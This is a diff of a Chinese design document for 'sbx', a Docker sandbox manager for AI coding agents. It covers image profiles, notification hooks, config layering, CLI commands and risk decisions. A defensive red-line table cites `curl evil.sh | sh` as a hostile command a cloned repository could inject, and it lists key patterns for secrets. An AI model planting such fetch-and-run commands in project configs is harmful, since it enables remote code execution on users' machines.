@@ -122,7 +122,9 @@ Workspace (git 仓库) 1 ──── * Task 1 ──── 1 Sandbox
    任意状态 ──sbx drop──► (销毁，删除分支，需要确认)
 ```
 
-状态由两部分推导：docker 容器状态（运行中、已退出、OOMKilled）和 state 目录里的 `status.json`（由 Agent hooks 写入 `running` 或 `idle`）。
+状态由三部分推导：docker 容器状态（运行中、已退出、OOMKilled）、state 目录里的 `status.json`（由 Agent hooks 写入 `running` 或 `idle`），以及 headless 留下的 `run.exit`。
+
+实现补充（M3-7）：**headless 跑完由容器内的包装脚本 `kill 1` 停掉容器**（主进程是 `sleep infinity`，不会自己退），这样整夜批量派发时跑完一个就释放一份内存和一个 `max_running` 名额。`on_exit` 必须在 `kill 1` 之前**同步**跑完，否则通知进程会被连带杀掉。容器因此是被 SIGTERM 结束的，退出码没有意义，`sbx ls` 显示的是 `run.exit` 里 claude 的退出码。
 
 ---
 
@@ -203,7 +205,18 @@ Workspace (git 仓库) 1 ──── * Task 1 ──── 1 Sandbox
 | `py-rust`（B） | uv（负责 Python 版本和依赖）、rustup 加 stable 工具链、cargo 常用组件（clippy、rustfmt） |
 
 - 项目里有 `.tool-versions`、`mise.toml`、`.nvmrc`、`.python-version`、`rust-toolchain.toml` 时，按文件内容自动安装对应版本，安装结果放在全局共享的 `sbx-mise` 或 rustup 目录里。
-- 自定义 Profile：在 `<repo>/.sbx/Dockerfile` 里写，或者在配置里写 `profile.image = "<镜像名>"`。前提是 Debian 或 Ubuntu 系。
+- 自定义 Profile：在 `<repo>/.sbx/Dockerfile` 里写，或者在配置里写 `image = "<镜像名>"`。前提是 Debian 或 Ubuntu 系。
+
+实现补充（M3-1、M3-2、M3-3、M3-5）：
+
+- 优先级：配置里的 `image` > `<repo>/.sbx/Dockerfile` > `profile`，全部收口在 `imageInputs()`。**配置键是顶层的 `image` 而不是本节原来写的 `profile.image`**——`profile` 是标量，TOML 里没法再当表用。
+- `.sbx/Dockerfile` 落在信任确认的覆盖范围内（§9.3），所以"项目自带镜像"这件事天然要先过 `sbx trust`。
+- 底层不是 Debian/Ubuntu 系时明确报错；检查命令末尾要 `exit 0`，否则 `command -v` 找不到东西会让整条命令非 0 退出，被当成"镜像跑不起来"而放行。
+- **Node 属于 Agent 层，不属于 Profile**：claude 是 npm 包，而 py-rust 里没有 Node。Agent 层发现底层没有 npm 就自己装一份，这样 Profile 真的只管语言环境（§5.1）。
+- py-rust 里不装系统 python：这个 Profile 的 Python 由 uv 负责，再来一个系统解释器只会让"我现在用的是哪个 python"变得不好回答。
+- **`curl ... | sh` 的退出码是 sh 的**：下载失败时那一层会"构建成功"但什么都没装上（uv 实测静默缺失过一次）。装 uv 和 mise 都改成先下载、再执行、最后 `--version` 验一遍。
+- mise：数据目录挂全局共享的 `sbx-mise`，启动前在宿主机扫版本文件，有才进容器装；装不上只警告不拦。两个坑——mise 默认不读 `.nvmrc` 这类惯用版本文件（要 `MISE_IDIOMATIC_VERSION_FILE_ENABLE_TOOLS`），以及 login shell 会被 `/etc/profile` 重置 PATH 把 shims 挤掉（§5.3 的老坑），所以额外放一份 `/etc/profile.d/10-sbx-mise.sh`。
+- 依赖遮盖的默认值按 Profile 分（web-go → `node_modules`/`.next`，py-rust → `.venv`/`target`），在**四层合并之后**按最终 profile 补上再取并集：profile 可能被后面的层改掉，而列表是并集的，先放 web-go 的默认值再并上 py-rust 的会得到一份四不像（多出来的遮盖项会在 worktree 里凭空建出目录）。
 
 ### 5.3 Agent 层要点
 
@@ -379,6 +392,15 @@ http_access allow u_<id>
   同一个文件里还写 **`disableClaudeAiConnectors: true`**（`network.cloud_mcp = false` 时，也就是默认）：代理拦掉 `mcp-proxy.anthropic.com` 之后 claude 会反复重试，实测一分钟内撞出 321 次 403。这个键从源头关掉云端连接器的拉取，官方文档注明它"`true` 在任何层都生效"，所以注入层写就够了（R11）。
   - `status.json` 先写临时文件再 rename；同时追加 `events.log` 方便排查。
   - 不复制宿主机的 hooks。
+
+实现补充（M3-8、M3-10）：
+
+- 事件表 M1 就实现完了（`agent.hookEvents`）。M3-7 实测确认 **headless 下事件序列同样完整**：`SessionStart → UserPromptSubmit → PreToolUse → Stop → SessionEnd`，所以 `on_exit` 挂 `SessionEnd` 在两种模式下都成立。
+- **通知走单独的 `notify.sh`，不塞进 `status.sh`**：状态是 `sbx ls` 的依据，必须永远快且不失败；通知是会挂住的网络 IO，两者的失败语义也不一样（状态写不进去是 bug，通知发不出去是日常）。一个事件可以挂多条 command hook，`status.sh` 排在前面——状态先落盘，通知后发。
+- `notify.sh` 的三条硬要求：**永远 exit 0**（hook 失败会污染 claude 的 transcript）、20 秒超时、按 `notify_throttle`（默认 600 秒）节流。`Notification` 是"等人处理"时反复触发的事件，不节流会刷屏。交互模式下通知放后台跑（`setsid`，claude 等不到也杀不掉它）。
+- **`on_exit` 在 headless 下由包装脚本发，不走 hook**：只有包装脚本拿得到 claude 的退出码（`SBX_EXIT_CODE`），而 SessionEnd hook 那条会先把节流窗口占掉（M3-10 实测踩到）。
+- 容器被 OOM 杀掉时收不到任何 hook，也就没有通知——ADR 0011 已接受这个缺口，只能靠 `sbx ls` 的 `exited(oom)` 事后发现。
+- 通知命令能拿到 `SBX_WS`、`SBX_TASK`（建容器时注入）和 `SBX_EVENT`、`SBX_STATE`、`SBX_TS`、`SBX_EXIT_CODE`（`notify.sh` 补）。
 - **Claude 首次启动状态的预置**（M0-5：否则交互模式的 TUI 会卡在引导、登录方式选择和 bypass 警告这些对话框上）。每次 Task 启动前幂等写入：
   | 文件（位于 sbx-home） | 字段 |
   |---|---|
@@ -424,7 +446,7 @@ http_access allow u_<id>
 
 内置默认 → `~/.sbx/config.toml` → `<repo>/.sbx/sandbox.toml` → `~/.sbx/workspaces/<ws>.toml`。
 
-列表取并集，标量值后者覆盖前者。项目层出现密钥字段（键名含 `key`、`token`、`secret`、`password`、`credential`）或绝对路径时，直接报错。
+列表取并集，标量值后者覆盖前者。项目层有三条红线（见下），撞上直接报错。
 
 实现补充（M2-1、M2-2）：
 
@@ -434,6 +456,19 @@ http_access allow u_<id>
 - 并集的代价：列表项**只能加不能减**，想去掉内置默认里的某一项目前没有办法。
 - 项目层的检查走通用的 map 遍历而不是 `Config` 结构体——未知字段在这一层也要被检查，否则写一个 sbx 还不认识的 `api_key` 就能绕过去。
 
+#### 项目层的红线
+
+项目层是跟着仓库走的，clone 下来就生效，所以三类东西不允许写在这一层：
+
+| 红线 | 判据 | 为什么 |
+|---|---|---|
+| 密钥类字段 | 键名含 `key/token/secret/password/credential` | 这一层不该决定凭据从哪来 |
+| 绝对路径 | 值以 `/`、`~/`、`C:\` 开头 | 这一层不该指向宿主机上的具体路径 |
+| **可执行命令**（M3-10） | 键名形如 `on_*`、`*_cmd`、`*_command`、`*_script`、`*_hook` | 这一层不该决定沙箱里执行什么命令。`on_idle = "curl evil.sh \| sh"` 前两条红线都拦不住，而信任确认时没人会逐行读 shell |
+
+三条都走通用的 map 遍历，sbx 还不认识的字段也挡得住。
+
+
 ### 9.2 示例
 
 `~/.sbx/config.toml`（个人全局）：
@@ -441,7 +476,9 @@ http_access allow u_<id>
 ```toml
 default_agent = "claude"
 max_running   = 3
-on_idle = "curl -s -X POST https://open.feishu.cn/open-apis/bot/v2/hook/xxx -d '{\"msg_type\":\"text\",\"content\":{\"text\":\"$SBX_TASK idle\"}}'"
+# 注意是双引号：$SBX_TASK 落在 shell 单引号里不会展开，webhook 收到的会是字面量
+on_idle = "curl -s -X POST https://open.feishu.cn/open-apis/bot/v2/hook/xxx --data-raw \"{\\\"msg_type\\\":\\\"text\\\",\\\"content\\\":{\\\"text\\\":\\\"$SBX_TASK idle\\\"}}\""
+notify_throttle = 600         # 两次同类通知的最小间隔（秒）
 
 [network]
 upstream = "http://host.docker.internal:7890"   # 宿主机代理；留空表示直连
@@ -504,8 +541,8 @@ memory = "4g"                 # 覆盖个人全局默认值（默认 3g）
 | `sbx ls [--all]` | 列出当前 Workspace 的 Task（`--all` 列出所有 Workspace）：状态、分支、ahead 数和 diff 统计、最后活动时间、工作目录（PATH）、被拒请求数 |
 | `sbx stop <task>` | 停止 agent 容器（以及独占 proxy），保留一切；如果这是最后一个 shared Task，顺带停掉 `sbx-proxy` |
 | `sbx shell <task>` | 在 Task 容器里打开一个 bash |
-| `sbx logs <task>` | 查看 `run.log` |
-| `sbx port <task> <port>` | 映射到宿主机 `127.0.0.1` 上的随机空闲端口并打印地址（实现方式：在 egress 网络上起一个 socat 转发容器，或重建 agent 容器） |
+| `sbx logs <task> [-f] [-n <行数>]` | 查看 `run.log`。直接读宿主机上的文件（state 本来就是 bind mount），**容器停了照样看得到**——headless 跑完容器就停了，这是常态 |
+| `sbx port <task> [port] [--rm]` | 映射到宿主机 `127.0.0.1` 上的随机空闲端口并打印地址（socat 转发容器，R7 已定）。省略 port 时列出已映射的；`--rm` 收回 |
 | `sbx run ... [--net open\|allowlist]` | 本次的网络模式，覆盖配置 |
 | `sbx net denied [task]` / `sbx net allow <host>...` | 见 §6.5。`--project` 待 M2-1 |
 | `sbx login claude\|codex` | 见 §7.1 |
@@ -514,7 +551,7 @@ memory = "4g"                 # 覆盖个人全局默认值（默认 3g）
 | `sbx memory pull [--yes]` | 把沙箱里新记的项目记忆导回宿主机：先展示差异，确认后写入（ADR 0016） |
 | `sbx done <task>` | 删除容器、Task 网络、依赖 volume、worktree、state，以及共享 proxy 上的凭据和片段；保留 `sbx/<task>` 分支 |
 | `sbx drop <task>` | 同上，并删除分支；需要输入 task 名确认 |
-| `sbx doctor` | 检查 docker 可用性、上游代理连通性、登录态、信任状态 |
+| `sbx doctor [--quick] [--strict]` | 表驱动的 8 项检查：docker、VM 内存（R10）、上游代理连通性、`sbx-proxy` 健康（R8）、登录态、信任状态、通知配置、首次启动冒烟（R9）。每项给 `✓ ! ✗ -` 和一行修复建议。**有 fail 才非 0 退出**，warn 不算（否则脚本里都得 `\|\| true`）；`--strict` 下 warn 也算 |
 
 ### 10.1 `sbx run` 主流程
 
@@ -612,7 +649,7 @@ docs/
 | R5 | 白名单太严，Agent 夜里被卡住 | 进度停滞 | `net denied` 可以快速定位；语言栈预设要尽量完整 |
 | R6 | 共享 proxy 需要带认证的代理 URL，部分工具可能不支持 | 这些工具在 shared 模式下无法联网 | ✅ 已解除（M0-4：被测的 10 个工具都兼容） |
 | R8 | 共享 proxy 是单点 | 异常时所有 shared Task 断网 | `sbx doctor` 检测并重建；对此敏感的 Task 用 dedicated |
-| R7 | `sbx port` 的实现方式（转发容器还是重建容器） | 实现复杂度 | M3 实现时决定 |
+| R7 | `sbx port` 的实现方式（转发容器还是重建容器） | 实现复杂度 | ✅ 已决定（M3-11）：socat 转发容器。重建 agent 容器会杀掉正在跑的会话，无人值守下不可接受。转发容器要**先接默认 bridge 再 connect 到 Task 网络**——Task 网络是 `--internal` 的，docker 不会给只连它的容器做端口映射，`-p` 会静默不生效 |
 | R9 | Claude Code 的内部状态字段（引导、bypass 警告）随版本变化 | 交互模式卡在对话框上，无人值守失效 | 升级时和 doctor 里做冒烟测试；出现问题时退回 headless 模式 |
 | R10 | Docker VM 内存（8GB）不足以支撑 `max_running × memory` | 并发高峰时 VM 级 OOM | ✅ 已决定：VM 调到 10GB，每个 Task 3g × 3；超出时给出警告 |
 | R11 | 云端 MCP 被拦截后 claude 持续重试 | 日志噪音，有少量开销 | ✅ 已解除：官方开关是 settings 里的 `disableClaudeAiConnectors`，`cloud_mcp = false` 时由 sbx 注入；`net denied` 仍然把这类归到"策略拦截/遥测"并默认隐藏 |
